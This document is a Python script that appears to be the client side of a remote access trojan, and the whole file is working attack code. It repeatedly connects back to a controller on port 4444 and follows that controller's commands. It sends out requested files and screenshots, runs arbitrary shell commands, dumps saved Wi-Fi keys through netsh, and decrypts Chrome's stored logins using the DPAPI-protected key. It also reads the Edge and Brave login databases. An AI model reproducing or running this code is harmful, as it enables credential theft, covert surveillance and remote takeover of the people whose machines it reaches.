import socket
import subprocess
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import platform
import time
import threading
from colorama import Fore, init
from PIL import ImageGrab  # New import for capturing screenshots
from io import BytesIO  # New import for handling byte streams

# Initialize colorama
init(autoreset=True)

# Client configuration
SERVER_IP = '127.0.0.1'  # Replace with the actual server IP
SERVER_PORT = 4444

# Determine if the client is on Windows
IS_WINDOWS = platform.system().lower() == "windows"
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

# Define paths for browser data
BROWSER_PATHS = {
    "Chrome": os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % os.environ['USERPROFILE']),
    "Edge": os.path.normpath(r"%s\\AppData\\Local\\Microsoft\\Edge\\User Data" % os.environ['USERPROFILE']),
    "Brave": os.path.normpath(r"%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data" % os.environ['USERPROFILE']),
    "Firefox": os.path.normpath(r"%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles" % os.environ['USERPROFILE']),
}

def connect_to_server():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))
            print(Fore.GREEN + "Connected to server.")
            return client_socket
        except ConnectionRefusedError:
            print(Fore.RED + "Server unavailable. Retrying in 5 seconds...")
            time.sleep(5)

def send_data_forever(client_socket):
    try:
        while True:
            time.sleep(10)  # Keep the connection alive
    except (ConnectionAbortedError, BrokenPipeError):
        client_socket.close()
        main()  # Restart connection process if connection breaks

def run_in_background():
    client_socket = connect_to_server()
    send_thread = threading.Thread(target=send_data_forever, args=(client_socket,))
    send_thread.daemon = True  # Run as background service
    send_thread.start()
    return client_socket

def list_files(directory="."):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Directory not found: {directory}"
    except Exception as e:
        return f"Error listing files: {str(e)}"

def current_directory():
    return os.getcwd()

def download_file(client_socket, file_path):
    try:
        if os.path.isfile(file_path):
            file_size = os.path.getsize(file_path)
            client_socket.send(f"SIZE {file_size}".encode())
            ack = client_socket.recv(1024).decode()  # Wait for ACK from server

            if ack == "ACK":
                with open(file_path, "rb") as file:
                    while True:
                        chunk = file.read(4096)
                        if not chunk:
                            break
                        client_socket.send(chunk)
                print(Fore.GREEN + f"File '{file_path}' sent successfully.")
            else:
                print(Fore.RED + "Server did not acknowledge file size.")
        else:
            client_socket.send(b"ERROR File not found")
    except Exception as e:
        client_socket.send(f"ERROR {str(e)}".encode())

def capture_and_send_screenshot(client_socket):
    try:
        # Capture the screenshot
        screenshot = ImageGrab.grab()
        byte_io = BytesIO()
        screenshot.save(byte_io, format='PNG')  # Save screenshot to BytesIO buffer
        byte_io.seek(0)  # Seek to the start of the BytesIO buffer

        # Send the screenshot size first
        screenshot_size = byte_io.getbuffer().nbytes
        client_socket.send(f"SIZE {screenshot_size}".encode())
        ack = client_socket.recv(1024).decode()  # Wait for ACK from server

        if ack == "ACK":
            # Send screenshot data
            client_socket.send(byte_io.read())
            print(Fore.GREEN + "Screenshot sent successfully.")
        else:
            print(Fore.RED + "Server did not acknowledge screenshot size.")
    except Exception as e:
        print(Fore.RED + f"Error capturing screenshot: {e}")

def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True)
        return f"Started command: {command}"
    except Exception as e:
        return str(e)

def handle_server_commands(client_socket):
    while True:
        command = client_socket.recv(4096).decode()
        if command.startswith("download"):
            file_name = command.split(" ", 1)[1]
            download_file(client_socket, file_name)
        elif command.startswith("screenshot"):
            capture_and_send_screenshot(client_socket)  # New screenshot command
        elif command.startswith("execute"):
            shell_command = command[8:].strip()
            result = execute_command(shell_command)
            client_socket.send(result.encode())
        elif command == "exit":
            print(Fore.RED + "Exiting...")
            break
        elif command == "get_network_passwords":
            network_passwords = get_wifi_passwords()
            client_socket.send(network_passwords.encode())
        elif command == "extract_passwords":
            chrome_data = extract_chrome_passwords()
            edge_data = extract_edge_passwords()
            brave_data = extract_brave_passwords()
            response_data = f"{chrome_data}\n{edge_data}\n{brave_data}\n"
            client_socket.send(response_data.encode())
        elif command.startswith("list_files"):
            directory = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else "."
            files = list_files(directory)
            client_socket.send(files.encode())
        elif command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                client_socket.send(b"Changed directory successfully.")
            except FileNotFoundError:
                client_socket.send(b"ERROR: Directory not found.")
            except Exception as e:
                client_socket.send(f"ERROR: {str(e)}".encode())
        elif command == "current_dir":
            current_dir = current_directory()
            client_socket.send(current_dir.encode())
        else:
            print(Fore.RED + f"Received unknown command: {command}")

def get_wifi_passwords():
    wifi_list = []
    try:
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        if command_output.returncode != 0:
            return "Failed to retrieve Wi-Fi profiles."

        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", command_output.stdout)
        for name in profile_names:
            name = name.strip()
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True)
            if profile_info_pass.returncode != 0:
                continue
            password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info_pass.stdout)
            if password_match:
                wifi_list.append(f"Wi-Fi: {name} - Password: {password_match.group(1).strip()}")
            else:
                wifi_list.append(f"Wi-Fi: {name} - No Password Found")
                
        return "\n".join(wifi_list) if wifi_list else "No Wi-Fi profiles found."
    except Exception as e:
        return f"Error retrieving Wi-Fi passwords: {e}"

def extract_chrome_passwords():
    try:
        if not os.path.exists(CHROME_PATH_LOCAL_STATE):
            return "Chrome local state file not found."

        with open(CHROME_PATH_LOCAL_STATE, "r") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        db_path = os.path.join(BROWSER_PATHS["Chrome"], "Default", "Login Data")
        if not os.path.exists(db_path):
            return "Chrome login data file not found."

        shutil.copyfile(db_path, "LoginData_copy")  # Temporary copy
        db = sqlite3.connect("LoginData_copy")
        cursor = db.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        data = []
        for url, username, enc_password in cursor.fetchall():
            if enc_password:
                try:
                    nonce = enc_password[3:15]
                    ciphertext = enc_password[15:-16]
                    tag = enc_password[-16:]
                    cipher = AES.new(key, AES.MODE_GCM, nonce)
                    decrypted_password = cipher.decrypt_and_verify(ciphertext, tag).decode()
                    data.append(f"URL: {url}, Username: {username}, Password: {decrypted_password}")
                except Exception as e:
                    print(f"Failed to decrypt password for {url}: {str(e)}")

        db.close()
        os.remove("LoginData_copy")
        return "\n".join(data) if data else "No passwords found in Chrome."
    except Exception as e:
        return f"Error retrieving Chrome passwords: {e}"

def extract_edge_passwords():
    edge_data = []
    try:
        db_path = os.path.join(BROWSER_PATHS["Edge"], "Default", "Login Data")
        if not os.path.exists(db_path):
            return "Edge login data file not found."

        shutil.copyfile(db_path, "EdgeLoginData_copy")  # Temporary copy
        db = sqlite3.connect("EdgeLoginData_copy")
        cursor = db.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, enc_password in cursor.fetchall():
            if enc_password:
                try:
                    edge_data.append(f"URL: {url}, Username: {username}, Password: [Encrypted Data]")
                except Exception as e:
                    edge_data.append(f"Failed to decrypt password for {url}: {str(e)}")

        db.close()
        os.remove("EdgeLoginData_copy")
        return "\n".join(edge_data) if edge_data else "No passwords found in Edge."
    except Exception as e:
        return f"Error retrieving Edge passwords: {e}"

def extract_brave_passwords():
    brave_data = []
    try:
        db_path = os.path.join(BROWSER_PATHS["Brave"], "Default", "Login Data")
        if not os.path.exists(db_path):
            return "Brave login data file not found."

        shutil.copyfile(db_path, "BraveLoginData_copy")  # Temporary copy
        db = sqlite3.connect("BraveLoginData_copy")
        cursor = db.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, enc_password in cursor.fetchall():
            if enc_password:
                try:
                    brave_data.append(f"URL: {url}, Username: {username}, Password: [Encrypted Data]")
                except Exception as e:
                    brave_data.append(f"Failed to decrypt password for {url}: {str(e)}")

        db.close()
        os.remove("BraveLoginData_copy")
        return "\n".join(brave_data) if brave_data else "No passwords found in Brave."
    except Exception as e:
        return f"Error retrieving Brave passwords: {e}"

def main():
    client_socket = connect_to_server()
    run_in_background()
    handle_server_commands(client_socket)

if __name__ == "__main__":
    main()
